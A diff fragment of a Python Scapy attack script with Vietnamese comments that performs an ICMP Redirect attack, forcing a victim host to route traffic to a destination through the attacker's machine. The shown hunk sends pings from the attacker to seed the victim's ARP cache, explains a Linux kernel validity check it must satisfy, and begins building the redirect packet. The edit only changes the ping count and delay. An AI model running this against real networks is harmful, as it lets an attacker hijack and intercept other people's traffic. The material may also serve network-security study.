@@ -18,11 +18,11 @@ print(f"[*] Gateway moi bi ep buoc (Attacker): {attacker_ip}")
 print(f"[*] Dich den bi be lai huong di:      {target_dst}")
 print("==================================================================")
 
-# 1. Ban 1 goi ping tu Attacker sang Victim de nap MAC cua Attacker vao bang ARP cua Victim
+# 1. Ban goi ping tu Attacker sang Victim de nap MAC cua Attacker vao bang ARP cua Victim
 # (Kernel Linux bat buoc dia chi Gateway moi phai hop le trong ARP - NUD_VALID)
 print("[*] 1. Nap MAC cua Attacker vao bang ARP cua Victim...")
-send(IP(src=attacker_ip, dst=victim_ip)/ICMP(), count=1, verbose=0)
-time.sleep(0.2)
+send(IP(src=attacker_ip, dst=victim_ip)/ICMP(), count=2, verbose=0)
+time.sleep(0.4)
 
 # 2. Tao goi ICMP Redirect:
 # BI QUYET KERNEL LINUX: Trong ham icmp_err() cua net/ipv4/icmp.c:
